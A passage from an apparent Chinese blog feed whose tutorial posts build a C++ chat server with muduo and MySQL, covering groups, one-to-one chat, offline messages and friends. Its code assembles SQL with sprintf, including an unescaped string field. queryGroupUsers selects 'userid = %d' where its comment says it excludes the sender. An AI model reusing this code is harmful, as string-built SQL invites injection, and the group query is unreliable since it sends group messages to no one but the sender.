class="string">&quot;&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;id = id;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;desc = desc;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setId</span><span class="params">(<span class="type">int</span> id)</span> </span>&#123; <span class="keyword">this</span>-&gt;id = id; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(string name)</span> </span>&#123; <span class="keyword">this</span>-&gt;name = name; &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setDesc</span><span class="params">(string desc)</span> </span>&#123; <span class="keyword">this</span>-&gt;desc = desc; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;id; &#125;</span><br><span class="line">    <span class="function">string <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;name; &#125;</span><br><span class="line">    <span class="function">string <span class="title">getDesc</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;desc; &#125;</span><br><span class="line">    <span class="function">vector&lt;GroupUser&gt; &amp;<span class="title">getUsers</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;users; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    string name;</span><br><span class="line">    string desc;</span><br><span class="line">    <span class="comment">// 存储这个组里面的成员</span></span><br><span class="line">    vector&lt;GroupUser&gt; users;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="加入群组"><a href="#加入群组" class="headerlink" title="加入群组"></a>加入群组</h1><blockquote><p>注意加入群组需要设置用户的角色</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GroupModel::addGroup</span><span class="params">(<span class="type">int</span> userid, <span class="type">int</span> groupid, string role)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 组装sql语句</span></span><br><span class="line">    <span class="type">char</span> sql[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(sql, <span class="string">&quot;insert into groupuser values(&#x27;%d&#x27;,&#x27;%d&#x27;,&#x27;%s&#x27;)&quot;</span>, groupid, userid, role.<span class="built_in">c_str</span>());</span><br><span class="line"></span><br><span class="line">    MySQL mysql;</span><br><span class="line">    <span class="keyword">if</span> (mysql.<span class="built_in">connect</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        mysql.<span class="built_in">update</span>(sql);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>string role</code>就是表明以什么身份加入群组（<code>creator</code> <code>normal</code>）</p><h1 id="群组查询"><a href="#群组查询" class="headerlink" title="群组查询"></a>群组查询</h1><p>根据用户<code>id</code>来查询所在群组，同时查询每个群组都有哪些成员。注意一个用户可能存在多个群组内</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询用户所在群组信息,因为一个用户可能存在于多个群组中,这里输出的是，一个用户的哪些群组，同时每个群组有哪些成员</span></span><br><span class="line"><span class="function">vector&lt;Group&gt; <span class="title">GroupModel::queryGroups</span><span class="params">(<span class="type">int</span> userid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.先根据userid在groupuser表中查询出该用户所属的群组信息</span></span><br><span class="line"><span class="comment">    2.再根据群组信息，查询属于该群组的所有userid，并且和user表进行多表查询，查出用户的详细信息</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> sql[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(sql, <span class="string">&quot;select a.id,a.groupname,a.groupdesc from allgroup a inner join groupuser b on a.id = b.groupid where b.userid = %d&quot;</span>, userid);</span><br><span class="line">    vector&lt;Group&gt; groupVec;</span><br><span class="line">    MySQL mysql;</span><br><span class="line">    <span class="keyword">if</span> (mysql.<span class="built_in">connect</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        MYSQL_RES *res = mysql.<span class="built_in">query</span>(sql);</span><br><span class="line">        <span class="keyword">if</span> (res != <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            MYSQL_ROW row;</span><br><span class="line">            <span class="comment">// 查询userid所有的群组信息</span></span><br><span class="line">            <span class="keyword">while</span> ((row = <span class="built_in">mysql_fetch_row</span>(res)) != <span class="literal">nullptr</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Group group;</span><br><span class="line">                <span class="comment">// select a.id,a.groupname,a.groupdesc 第一个是id，第二个是groupname，第三个是groupdesc</span></span><br><span class="line">                group.<span class="built_in">setId</span>(<span class="built_in">atoi</span>(row[<span class="number">0</span>]));</span><br><span class="line">                group.<span class="built_in">setName</span>(row[<span class="number">1</span>]);</span><br><span class="line">                group.<span class="built_in">setDesc</span>(row[<span class="number">2</span>]);</span><br><span class="line">                groupVec.<span class="built_in">emplace_back</span>(group);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">mysql_free_result</span>(res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询群组的用户信息</span></span><br><span class="line">    <span class="keyword">for</span> (Group &amp;group : groupVec)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(sql, <span class="string">&quot;select a.id,a.name,a.state,b.grouprole from user a inner join groupuser b on b.userid = a.id where b.groupid = %d&quot;</span>, group.<span class="built_in">getId</span>());</span><br><span class="line">        MYSQL_RES *res = mysql.<span class="built_in">query</span>(sql);</span><br><span class="line">        <span class="keyword">if</span> (res != <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            MYSQL_ROW row;</span><br><span class="line">            <span class="keyword">while</span> ((row = <span class="built_in">mysql_fetch_row</span>(res)) != <span class="literal">nullptr</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                GroupUser user;</span><br><span class="line">                user.<span class="built_in">setId</span>(<span class="built_in">atoi</span>(row[<span class="number">0</span>]));</span><br><span class="line">                user.<span class="built_in">setName</span>(row[<span class="number">1</span>]);</span><br><span class="line">                user.<span class="built_in">setState</span>(row[<span class="number">2</span>]);</span><br><span class="line">                user.<span class="built_in">setRole</span>(row[<span class="number">3</span>]);</span><br><span class="line">                group.<span class="built_in">getUsers</span>().<span class="built_in">emplace_back</span>(user);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">mysql_free_result</span>(res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> groupVec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="群组聊天"><a href="#群组聊天" class="headerlink" title="群组聊天"></a>群组聊天</h1><p>格式为：<code>userid</code>-&gt;<code>groupid</code>，因此需要根据<code>groupid</code>查询群组里面有哪些成员，然后向这些成员（除了自己）发送消息，同时注意群成员是否在线，若不在线，将消息存放到离线消息表中，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 群组聊天业务</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatService::groupChat</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> userid = js[<span class="string">&quot;id&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">    <span class="type">int</span> groupid = js[<span class="string">&quot;groupid&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; useridVec = _groupmodel.<span class="built_in">queryGroupUsers</span>(userid, groupid);</span><br><span class="line">    <span class="function">lock_guard&lt;mutex&gt; <span class="title">lock</span><span class="params">(_connMutex)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> id : useridVec)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> it = _userConnMap.<span class="built_in">find</span>(id);</span><br><span class="line">        <span class="keyword">if</span> (it != _userConnMap.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 转发消息</span></span><br><span class="line">            it-&gt;second-&gt;<span class="built_in">send</span>(js.<span class="built_in">dump</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 存储离线群消息</span></span><br><span class="line">            _offlinemodel.<span class="built_in">insert</span>(id, js.<span class="built_in">dump</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 根据指定的groupid查询群组用户id列表，除了userid本省，主要用与群聊服务</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">GroupModel::queryGroupUsers</span><span class="params">(<span class="type">int</span> userid, <span class="type">int</span> groupid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> sql[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(sql, <span class="string">&quot;select userid from groupuser where groupid = %d and userid = %d&quot;</span>, groupid, userid);</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; idVec;</span><br><span class="line">    MySQL mysql;</span><br><span class="line">    <span class="keyword">if</span> (mysql.<span class="built_in">connect</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        MYSQL_RES *res = mysql.<span class="built_in">query</span>(sql);</span><br><span class="line">        <span class="keyword">if</span> (res != <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            MYSQL_ROW row;</span><br><span class="line">            <span class="keyword">while</span> ((row = <span class="built_in">mysql_fetch_row</span>(res)) != <span class="literal">nullptr</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                idVec.<span class="built_in">emplace_back</span>(<span class="built_in">atoi</span>(row[<span class="number">0</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">mysql_free_result</span>(res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> idVec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此我们就完成了服务器的开发，下一节我们开始开发客户端。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本章我们实现群组创建、添加群组、群组聊天等功能，首先我们先看下和群组相关的表结构&lt;/p&gt;</summary>
    
    
    
    <category term="集群聊天服务器" scheme="http://www.shicoder.top/categories/%E9%9B%86%E7%BE%A4%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>集群聊天服务器三</title>
    <link href="http://www.shicoder.top/posts/3335875735.html"/>
    <id>http://www.shicoder.top/posts/3335875735.html</id>
    <published>2022-04-21T02:48:28.000Z</published>
    <updated>2022-04-26T09:16:15.789Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>本篇文章主要实现了聊天服务器中一对一聊天和添加好友功能</p><span id="more"></span><h1 id="一对一聊天"><a href="#一对一聊天" class="headerlink" title="一对一聊天"></a>一对一聊天</h1><p>以下是聊天对应的<code>json</code>字符串格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;msgid&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;from&quot;</span><span class="punctuation">:</span><span class="string">&quot;lisi&quot;</span><span class="punctuation">,</span><span class="attr">&quot;to&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;hello4&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>同样在<code>ChatService</code>中添加如下函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一对一聊天业务</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">oneChat</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>注意：锁的处理</p></blockquote><p>在一对一聊天中，我们需要服务器知道哪些用户是在线的，哪些用户是离线的，对于在线用户，我们直接将聊天信息转发，对于离线好友，我们需要将信息先存储在离线信息表中，然后等对方在线后，再进行发送。所以我们采用一个<code>map</code>来保存<code>userid</code>和<code>conn</code>的对应关系</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储在线用户的连接，因为比如用户1向用户2发送请求，这时候需要服务器来做中间转化</span></span><br><span class="line"><span class="comment">// 所以服务器需要知道用户2是否在线</span></span><br><span class="line">unordered_map&lt;<span class="type">int</span>, TcpConnectionPtr&gt; _userConnMap;</span><br></pre></td></tr></table></figure><p>这样在用户登陆的时候，若登陆成功，需要给当前用户的<code>userid</code>添加一个<code>conn</code>的<code>map</code>键值对，同时利用锁进行处理，防止出现意外。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在这里加&#123;&#125;主要就是设置作用域，lock_guard&lt;mutex&gt; lock(_connMutex)中lock_guard会在构造函数加锁，</span></span><br><span class="line"><span class="comment">// 析构函数释放锁，同时由于只需要insert需要锁，所以加一个作用域，这样避免给不必要的地方加锁，浪费资源</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">lock_guard&lt;mutex&gt; <span class="title">lock</span><span class="params">(_connMutex)</span></span>;</span><br><span class="line">    <span class="comment">// 记录用户连接信息</span></span><br><span class="line">    _userConnMap.<span class="built_in">insert</span>(&#123;id, conn&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//登陆成功，然后更新用户登陆信息</span></span><br><span class="line">user.<span class="built_in">setState</span>(<span class="string">&quot;online&quot;</span>);</span><br><span class="line">_usermodel.<span class="built_in">updateState</span>(user);</span><br><span class="line">json response;</span><br><span class="line">response[<span class="string">&quot;msgid&quot;</span>] = LOGIN_MSG_ACK;</span><br><span class="line">response[<span class="string">&quot;error&quot;</span>] = <span class="number">0</span>; <span class="comment">//0表示成功</span></span><br><span class="line">response[<span class="string">&quot;id&quot;</span>] = user.<span class="built_in">getId</span>();</span><br><span class="line">response[<span class="string">&quot;name&quot;</span>] = user.<span class="built_in">getName</span>();</span><br></pre></td></tr></table></figure><p>这样采用如下代码实现消息的转发或者消息的存储</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一对一聊天业务</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatService::oneChat</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 对方id</span></span><br><span class="line">    <span class="type">int</span> toid = js[<span class="string">&quot;to&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">lock_guard&lt;mutex&gt; <span class="title">lock</span><span class="params">(_connMutex)</span></span>;</span><br><span class="line">        <span class="keyword">auto</span> it = _userConnMap.<span class="built_in">find</span>(toid);</span><br><span class="line">        <span class="keyword">if</span> (it != _userConnMap.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// toid在线，转发消息</span></span><br><span class="line">            it-&gt;second-&gt;<span class="built_in">send</span>(js.<span class="built_in">dump</span>());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不在线，存储离线消息</span></span><br><span class="line">    _offlinemodel.<span class="built_in">insert</span>(toid, js.<span class="built_in">dump</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于离线好友，我们需要在他登陆的时候，首先去查询<code>_offlinemodel</code>这个<code>map</code>中是否有自己对应的离线消息，若有，要先让服务器推送消息给用户，然后从<code>map</code>中删除对应的消息</p><blockquote><p>注意，我在这里暂时打算让服务器用一个<code>vector&lt;string&gt;</code>存储离线消息</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询该用户是否有离线信息</span></span><br><span class="line">vector&lt;string&gt; vec = _offlinemodel.<span class="built_in">query</span>(id);</span><br><span class="line"><span class="keyword">if</span> (!vec.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">    response[<span class="string">&quot;offlinemsg&quot;</span>] = vec;</span><br><span class="line">    <span class="comment">// 再删除离线消息</span></span><br><span class="line">    _offlinemodel.<span class="built_in">remove</span>(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="添加好友"><a href="#添加好友" class="headerlink" title="添加好友"></a>添加好友</h1><p>以下是添加好友的json字符串</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;msgid&quot;</span><span class="punctuation">:</span><span class="number">6</span><span class="punctuation">,</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;friendid&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>同样在<code>ChatService</code>中添加如下代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加好友请求 msgid id friendid</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatService::addFriend</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, json &amp;js, Timestamp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> userid = js[<span class="string">&quot;id&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">    <span class="type">int</span> friendid = js[<span class="string">&quot;friendid&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储好友信息</span></span><br><span class="line">    _friendmodel.<span class="built_in">insert</span>(userid, friendid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先需要在用户登陆的时候，服务器自动推送给用户其对应的好友，所以需要一个<code>vector&lt;User&gt;</code>来存储该用户对应的好友列表，同时将这个<code>vector</code>和<code>userid</code>在数据库中保存，表结构如下</br></p><table><thead><tr><th align="center">字段名称</th><th align="center">字段类型</th><th align="center">字段说明</th><th align="center">约束</th></tr></thead><tbody><tr><td align="center">userid</td><td align="center">INT</td><td align="center">用户id</td><td align="center">NOT NULL、联合主键</td></tr><tr><td align="center">friendid</td><td align="center">INT</td><td align="center">好友id</td><td align="center">NOT NULL、联合主键</td></tr></tbody></table><p>在用户登录成功之后，服务器会去查询用户的好友列表，然后推送给用户，其代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询该用户的好友信息 并返回</span></span><br><span class="line">vector&lt;User&gt; uservec = _friendmodel.<span class="built_in">query</span>(id);</span><br><span class="line"><span class="keyword">if</span> (!uservec.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;string&gt; vec2;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;i : uservec)</span><br><span class="line">    &#123;</span><br><span class="line">        json js;</span><br><span class="line">        js[<span class="string">&quot;id&quot;</span>] = i.<span class="built_in">getId</span>();</span><br><span class="line">        js[<span class="string">&quot;name&quot;</span>] = i.<span class="built_in">getName</span>();</span><br><span class="line">        js[<span class="string">&quot;state&quot;</span>] = i.<span class="built_in">getState</span>();</span><br><span class="line">        vec2.<span class="built_in">emplace_back</span>(js.<span class="built_in">dump</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    response[<span class="string">&quot;friends&quot;</span>] = vec2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>_friendmodel.query()</code>使用的是多表联合查询，<code>sql</code>语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a.id,a.name,a.state <span class="keyword">from</span> <span class="keyword">user</span> a <span class="keyword">inner</span> <span class="keyword">join</span> friend b <span class="keyword">on</span> b.friendid <span class="operator">=</span> a.id <span class="keyword">where</span> b.userid <span class="operator">=</span> <span class="operator">%</span>d</span><br></pre></td></tr></table></figure><p>下一章我们实现下群组的创建与群组之间的聊天业务。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本篇文章主要实现了聊天服务器中一对一聊天和添加好友功能&lt;/p&gt;</summary>
    
    
    
    <category term="集群聊天服务器" scheme="http://www.shicoder.top/categories/%E9%9B%86%E7%BE%A4%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>集群聊天服务器二</title>
    <link href="http://www.shicoder.top/posts/2223635098.html"/>
    <id>http://www.shicoder.top/posts/2223635098.html</id>
    <published>2022-04-21T02:46:54.000Z</published>
    <updated>2022-04-26T09:15:59.601Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>本次主要是对<code>Chatserver</code>和<code>Chatservice</code>进行代码实现</p><span id="more"></span><h1 id="ChatServer"><a href="#ChatServer" class="headerlink" title="ChatServer"></a><code>ChatServer</code></h1><p>首先我们利用<code>muduo</code>库建立一个<code>ChatServer</code>类，<code>muduo</code>库的讲解我会在后面再写一个项目来深入分析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ChatServer</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">ChatServer</span>(EventLoop *loop,</span><br><span class="line">               <span class="type">const</span> InetAddress &amp;listenAddr,</span><br><span class="line">               <span class="type">const</span> string &amp;nameArg);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    TcpServer _server;</span><br><span class="line">    EventLoop *_loop;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 回调连接相关的事件</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onConnection</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn)</span></span>;</span><br><span class="line">    <span class="comment">// 回调读写事件</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onMessage</span><span class="params">(<span class="type">const</span> TcpConnectionPtr &amp;conn, Buffer *buffer, Timestamp time)</span></span>;</span><br><span 